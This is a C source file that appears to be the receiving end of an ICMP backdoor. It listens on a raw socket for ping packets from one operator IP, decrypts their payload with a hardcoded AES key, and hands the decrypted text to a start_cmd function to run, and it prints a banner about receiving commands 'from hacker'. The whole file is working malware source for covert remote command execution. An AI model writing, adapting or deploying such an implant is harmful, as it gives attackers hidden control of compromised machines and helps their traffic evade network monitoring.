#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <setjmp.h>
#include <errno.h>
#include "aes.h"
#include "icmp1.h"



int main(int argc, char* argv[]){
	 
	int sockfd,n,i;
	struct protoent *protocol;
	struct ip*ipadd;
	struct icmp*icmp;
	unsigned char *key = "qaxswedcvfrt1097";
	char*ip = argv[1];
	
	char buf[2048];
	AES_Init(key);
	char * src_ip;
	char *cmp_ip = argv[1];
	

	
	if((protocol = getprotobyname("icmp"))==NULL)
	{
		perror("error\n");
		exit(EXIT_FAILURE);
	}
	if((sockfd = socket(AF_INET,SOCK_RAW,protocol->p_proto))<0)
	{
		perror("socket error\n");
		exit(1);
	}
	while(1){
		printf("----------------start recieve cmd from hacker------------------\n");
		bzero(buf,2048);
		n = recv(sockfd,buf,2048,0);
		if(n<=0){
			printf("socket recv error\n");
			exit(0);
		}
		else{
			ipadd = (struct ip*)buf;
			
			src_ip = inet_ntoa(ipadd->ip_src);
			//printf("src_ip is %s\n",src_ip);
			int cmp_num = strcmp(src_ip,cmp_ip);
			
			icmp = (struct icmp*)(ipadd+1);
			if(strlen(icmp->icmp_data)<=0){
				printf("icmp_data is null\n");
				continue;
			}
			
			if(icmp->icmp_type == ICMP_ECHO && icmp->icmp_code == 0 && cmp_num == 0){
				AES_Decrypt(icmp->icmp_data,icmp->icmp_data,strlen(icmp->icmp_data), NULL);
				i = AES_delete_pkcs7Padding(icmp->icmp_data,strlen(icmp->icmp_data)); 
				
				char docker[2048] = {0};
				
				printf("icmp data is %s strlen is %d , i is %d\n",icmp->icmp_data,strlen(icmp->icmp_data),i);
				//printf("icmp decode sucess\n");
				 
				memcpy(docker,icmp->icmp_data,i);
				start_cmd(ip,docker,sockfd);
			}
			
		}
	}
	
	
	close(sockfd);
	return 0;
}
	


